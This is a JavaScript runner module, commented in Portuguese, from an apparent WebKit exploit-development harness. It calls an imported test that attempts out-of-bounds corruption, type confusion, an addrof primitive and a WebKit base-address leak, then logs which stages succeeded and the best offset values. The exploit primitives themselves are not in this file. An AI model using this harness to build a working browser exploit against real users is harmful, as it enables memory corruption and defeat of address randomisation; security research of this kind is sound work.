// js/script3/runAllAdvancedTestsS3.mjs (Adaptado para Testes Massivos Combinados)
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3 } from './s3_utils.mjs';
import { getOutputAdvancedS3, getRunBtnAdvancedS3 } from '../dom_elements.mjs';
import {
    executeTypedArrayVictimAddrofAndWebKitLeak_R43, // Esta é a função do script de teste
    FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT // Este é o nome do módulo exportado
} from './testArrayBufferVictimCrash.mjs';

async function runHeisenbugReproStrategy_TypedArrayVictim_R43_Combined() { // Nome da função runner atualizado
    const FNAME_RUNNER = "runHeisenbugReproStrategy_TypedArrayVictim_R43_CombinedMassive";
    logS3(`==== INICIANDO Estratégia (${FNAME_RUNNER}) ====`, 'test', FNAME_RUNNER);
    const result = await executeTypedArrayVictimAddrofAndWebKitLeak_R43();

    const module_name_for_title = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;

    if (result.errorOccurred) {
        logS3(`  RUNNER (Combined): Teste principal capturou ERRO: ${String(result.errorOccurred)}`, "critical", FNAME_RUNNER);
        document.title = `${module_name_for_title}: MainTest ERR!`;
    } else if (result) {
        let bestParamsMsg = 'N/A';
        if (result.oob_params_of_best_result) {
            bestParamsMsg = `Offset: ${result.oob_params_of_best_result.offset}, Valor: ${result.oob_params_of_best_result.value}`;
        }
        logS3(`  RUNNER (Combined): Completou. Melhores Parâmetros OOB: ${bestParamsMsg}`, "good", FNAME_RUNNER);
        logS3(`  RUNNER (Combined): Detalhes Sonda TC (Best): ${result.tc_probe_details ? JSON.stringify(result.tc_probe_details) : 'N/A'}`, "leak_detail", FNAME_RUNNER);

        const heisenbugSuccessfullyDetected = result.heisenbug_on_M2_in_best_result;
        const addrofResult = result.addrof_result;
        const webkitLeakResult = result.webkit_leak_result;
        const postOOBAnalysis = result.post_oob_victim_buffer_analysis_best_result;


        logS3(`  RUNNER (Combined): Heisenbug TC Sonda (Best): ${heisenbugSuccessfullyDetected ? "CONFIRMADA" : "NÃO CONFIRMADA"}`, heisenbugSuccessfullyDetected ? "vuln_potential" : "warn", FNAME_RUNNER);

        if (postOOBAnalysis) {
            logS3(`  RUNNER (Combined): Análise Pós-OOB do Buffer (Best):`, "info_emphasis", FNAME_RUNNER);
            logS3(`    Padrão de preenchimento encontrado: ${postOOBAnalysis.buffer_fill_pattern_found}`, postOOBAnalysis.buffer_fill_pattern_found ? "good" : "vuln_potential", FNAME_RUNNER);
            logS3(`    Notas: ${postOOBAnalysis.notes}`, "info", FNAME_RUNNER);
        } else {
            logS3(`  RUNNER (Combined): Detalhes da Análise Pós-OOB não disponíveis.`, "warn", FNAME_RUNNER);
        }

        if (addrofResult) {
            logS3(`  RUNNER (Combined): Teste Addrof (Best): ${addrofResult.msg} (Addr: ${addrofResult.leaked_object_addr || addrofResult.leaked_object_addr_candidate_str || 'N/A'})`, addrofResult.success ? "vuln" : "warn", FNAME_RUNNER);
        }
        if (webkitLeakResult) {
            logS3(`  RUNNER (Combined): Teste WebKit Base Leak (Best): ${webkitLeakResult.msg} (Base: ${webkitLeakResult.webkit_base_candidate || 'N/A'})`, webkitLeakResult.success ? "vuln" : "warn", FNAME_RUNNER);
        }

        // Atualizar título da página (usando a lógica do script de teste)
        document.title = `${module_name_for_title}_Final: ${ (result.webkit_leak_result.success ? "WebKitLeak SUCCESS!" : (result.addrof_result.success ? "Addrof SUCCESS!" : ( (heisenbugSuccessfullyDetected && postOOBAnalysis && !postOOBAnalysis.buffer_fill_pattern_found) ? "TC & Buffer Corrupt!" : (heisenbugSuccessfullyDetected ? "TC OK" : (postOOBAnalysis && !postOOBAnalysis.buffer_fill_pattern_found ? "Buffer Corrupt" : "No Success"))))) }`;


        if (result.iteration_results_summary && result.iteration_results_summary.length > 0) {
            logS3(`  RUNNER (Combined): Sumário completo das iterações:`, "info", FNAME_RUNNER);
            result.iteration_results_summary.forEach((iter_sum, index) => {
                const tcSuccess = iter_sum.heisenbug_on_M2_confirmed_by_tc_probe;
                const bufferCorrupted = iter_sum.post_oob_victim_buffer_analysis_this_iter && !iter_sum.post_oob_victim_buffer_analysis_this_iter.buffer_fill_pattern_found;
                const addrofSuccessIter = iter_sum.addrof_result_this_iter?.success;
                const webkitLeakSuccessIter = iter_sum.webkit_leak_result_this_iter?.success;
                let logMsg = `    Iter ${index + 1} (Off ${iter_sum.oob_offset}, Val ${iter_sum.oob_value}): TC=${tcSuccess}, BufCorrupt=${bufferCorrupted}, Addrof=${addrofSuccessIter}, WebKitLeak=${webkitLeakSuccessIter}`;
                if(iter_sum.error) logMsg += `, Err: ${iter_sum.error}`;
                logS3(logMsg, "info", FNAME_RUNNER);
            });
        }
    } else {
        document.title = `${module_name_for_title}_Combined: Invalid Result Obj`;
    }
    logS3(`  Título da página final: ${document.title}`, "info", FNAME_RUNNER);
    await PAUSE_S3(MEDIUM_PAUSE_S3);
    logS3(`==== Estratégia (${FNAME_RUNNER}) CONCLUÍDA ====`, 'test', FNAME_RUNNER);
}

export async function runAllAdvancedTestsS3() {
    const FNAME_ORCHESTRATOR = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT}_MainOrchestrator_Combined`;
    logS3(`==== INICIANDO Script 3 (CombinedMassive) (${FNAME_ORCHESTRATOR}) ... ====`, 'test', FNAME_ORCHESTRATOR);
    await runHeisenbugReproStrategy_TypedArrayVictim_R43_Combined(); // Chamar a função runner atualizada
    logS3(`\n==== Script 3 (CombinedMassive) (${FNAME_ORCHESTRATOR}) CONCLUÍDO ====`, 'test', FNAME_ORCHESTRATOR);
    const runBtn = getRunBtnAdvancedS3(); if (runBtn) runBtn.disabled = false;

    // Lógica final do título, pode ser simplificada se o título já estiver bem definido
    if (!document.title.includes("SUCCESS") && !document.title.includes("Corrupt") && !document.title.includes("OK") && !document.title.includes("ERR")) {
         document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT}_Combined_Done`;
    }
}
